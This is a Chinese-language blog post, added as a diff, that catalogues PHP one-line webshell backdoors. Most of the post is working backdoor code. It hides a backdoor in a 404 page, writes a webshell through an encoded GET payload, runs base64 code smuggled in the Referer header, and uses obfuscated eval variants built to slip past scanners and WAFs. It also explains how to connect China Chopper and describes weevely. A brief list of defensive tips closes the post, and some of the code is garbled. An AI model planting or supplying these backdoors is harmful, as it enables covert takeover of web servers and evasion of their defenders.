@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>那些强悍的PHP一句话后门 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="Virink,技术博客,CTF,Writeup,代码审计,AUDIT,php,webshell">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+<link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.com/atom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2016/10/19/php_webshell.html">那些强悍的PHP一句话后门</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/php/"><i class="fa fa-tag"></i>php</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/webshell/"><i class="fa fa-tag"></i>webshell</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-10-19 12:28:37">2016-10-19 12:28:37</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h1>那些强悍的PHP一句话后门</h1>
+<p>我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。<br />
+强悍的PHP一句话后门<br />
+这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。</p>
+<h2>利用404页面隐藏PHP小马：</h2>
+<p>Not Found<br />
+The requested URL was not found on this server.</p>
+<pre><code>&lt;?php 
+@preg_replace(“/[pageerror]/e”,$_POST[‘error’],”saft”);
+header(‘HTTP/1.1 404 Not Found’);
+?&gt;
+</code></pre>
+<p>404页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。</p>
+<h2>无特征隐藏PHP一句话：</h2>
+<pre><code>&lt;?php
+session_start();
+$_POST[‘code’] &amp;&amp; $_SESSION[‘theCode’] = trim($_POST[‘code’]);
+$_SESSION[‘theCode’]&amp;&amp;preg_replace(‘\’a\’eis’,’e’.’v’.’a’.’l’.'(base64_decode($_SESSION[\’theCode\’]))’,’a’);
+?&gt;
+</code></pre>
+<p>将$_POST[‘code’]的内容赋值给$_SESSION[‘theCode’]，然后执行$_SESSION[‘theCode’]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</p>
+<h2>超级隐蔽的PHP后门：</h2>
+<pre><code>&lt;?php $_GET[a]($_GET[b]);?&gt;
+</code></pre>
+<p>仅用GET函数就构成了木马；<br />
+利用方法：</p>
+<pre><code>?a=assert&amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
+</code></pre>
+<p>执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</p>
+<h2>层级请求，编码运行PHP后门：</h2>
+<p>此方法用两个文件实现，文件1</p>
+<p><strong>1.php</strong></p>
+<pre><code>&lt;?php
+header(‘Content-type:text/html;charset=utf-8’);
+parse_str($_SERVER[‘HTTP_REFERER’], $a);
+if(reset($a) == ’10’ &amp;&amp; count($a) == 9) {
+eval(base64_decode(str_replace(” “, “+”, implode(array_slice($a, 6)))));
+}
+?&gt;
+</code></pre>
+<p><strong>2.php</strong></p>
+<pre><code>&lt;?php 
+header(‘Content- type:text/html;charset=utf-8’);
+//要执行的代码
+$code = &lt;&lt; $url, CURLOPT_HEADER =&gt; FALSE, CURLOPT_RETURNTRANSFER =&gt; TRUE, CURLOPT_REFERER =&gt; $referer);
+curl_setopt_array($ch, $options);
+echo curl_exec($ch);
+?&gt;
+</code></pre>
+<p>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。</p>
+<h2>PHP后门生成工具weevely</h2>
+<p>weevely 是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏 后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通 过weevely直接运行。<br />
+weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所 使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检 查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。</p>
+<h2>三个变形的一句话PHP木马</h2>
+<h3>第一个</h3>
+<pre><code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;
+</code></pre>
+<p>在菜刀里写<code>http://site/1.php?2=assert</code>密码是1</p>
+<h3>第二个</h3>
+<pre><code>&lt;?php
+$_="";
+$_[+""]="";
+$_="$_"."";
+$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
+?&gt;
+&lt;?php
+${'_'.$_}['_'](${'_'.$_}['__']);
+?&gt;
+</code></pre>
+<p>在菜刀里写<code>http://site/2.php?_=assert&amp;__=eval($_POST['pass'])</code> 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</p>
+<h3>第三个</h3>
+<pre><code>&lt;?php
+($b4dboy = $_POST['b4dboy']) &amp;&amp; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');
+?&gt;
+</code></pre>
+<p>str_rot13(&lsquo;riny&rsquo;)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！</p>
+<h2>最后列几个高级的PHP一句话木马后门：</h2>
+<h3>1、</h3>
+<pre><code>$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+</code></pre>
+<p>//菜刀一句话</p>
+<h3>2、</h3>
+<pre><code>$filename=$_GET['xbid'];
+include ($filename);
+</code></pre>
+<p>//危险的include函数，直接编译任何文件为php格式运行</p>
+<h3>3、</h3>
+<pre><code>$reg="c"."o"."p"."y";
+$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
+</code></pre>
+<p>//重命名任何文件</p>
+<h3>4、</h3>
+<pre><code>$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$gzid("/[discuz]/e",$_POST['h'],"Access");
+</code></pre>
+<p>//菜刀一句话</p>
+<h3>5、include ($uid);</h3>
+<p>//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif<br />
+//gif插一句话</p>
+<h3>6、典型一句话</h3>
+<p>程序后门代码</p>
+<pre><code>&lt;?php eval_r($_POST[sb])?&gt;
+</code></pre>
+<p>程序代码</p>
+<pre><code>&lt;?php @eval_r($_POST[sb])?&gt;
+</code></pre>
+<p>//容错代码<br />
+程序代码</p>
+<pre><code>&lt;?php assert($_POST[sb]);?&gt;
+</code></pre>
+<p>//使用lanker一句话客户端的专家模式执行相关的php语句<br />
+程序代码</p>
+<pre><code>&lt;?$_POST['sa']($_POST['sb']);?&gt;
+</code></pre>
+<p>程序代码</p>
+<pre><code>&lt;?$_POST['sa']($_POST['sb'],$_POST['sc'])?&gt;
+</code></pre>
+<p>程序代码</p>
+<pre><code>&lt;?php
+@preg_replace("/[email]/e",$_POST['h'],"error");
+?&gt;
+</code></pre>
+<p>//使用这个后,使用菜刀一句话客户端在配置连接的时候在&rdquo;配置&rdquo;一栏输入<br />
+程序代码</p>
+<pre><code>h=@eval_r($_POST1);
+</code></pre>
+<p>程序代码<br />
+//绕过&lt;?限制的一句话</p>
+<h2>总结</h2>
+<p>综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结!<br />
+如何应对PHP一句话后门：<br />
+我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：</p>
+<ol>
+<li>对PHP程序编写要有安全意识</li>
+<li>服务器日志文件要经常看，经常备份</li>
+<li>对每个站点进行严格的权限分配</li>
+<li>对动态文件及目录经常批量安全审查</li>
+<li>学会如何进行手工杀毒《即行为判断查杀》</li>
+<li>时刻关注，或渗入活跃的网络安全营地</li>
+<li>对服务器环境层级化处理，哪怕一个函数也可做规则</li>
+</ol>
+<p>来源： <a href="http://vpszn.net/vpssafe/102152502531.html">http://vpszn.net/vpssafe/102152502531.html</a></p>
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/10/19/php_webshell.html" target="_blank">那些强悍的PHP一句话后门</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-10-19 12:28:37">2016-10-19 12:28:37</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:44:51">2017-06-01 23:44:51</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/10/19/php_webshell.html" title="那些强悍的PHP一句话后门" target="_blank">https://www.virzz.com/2016/10/19/php_webshell.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2018-2019. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">concise</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
